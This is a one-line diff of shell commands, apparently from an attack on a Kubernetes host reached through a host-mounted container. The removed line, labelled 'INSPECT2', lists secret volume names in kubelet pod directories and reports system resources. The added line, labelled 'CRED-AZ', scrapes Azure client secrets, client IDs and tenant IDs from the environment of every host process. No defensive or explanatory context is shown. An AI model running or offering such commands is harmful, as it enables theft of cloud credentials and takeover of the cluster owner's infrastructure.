@@ -1,1 +1,1 @@
-echo N=$(cat /etc/hostname); for d in /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/; do basename $d 2>/dev/null; done | sort -u | grep -vE "kube-root|ca-certs|^certs$" | head -16; echo "DISK:"; df -h /host/var/lib/containerd 2>/dev/null | tail -1; echo "RAM:"; free -m | sed -n 2p; echo "CPU:$(nproc)" # INSPECT2
+grep -rh "AZURE_CLIENT_SECRET\|AZURE_CLIENT_ID\|AZURE_TENANT" /host/proc/*/environ 2>/dev/null | tr "\0" "\n" | grep -E "^(AZURE_)" | sort -u | head -10 # CRED-AZ
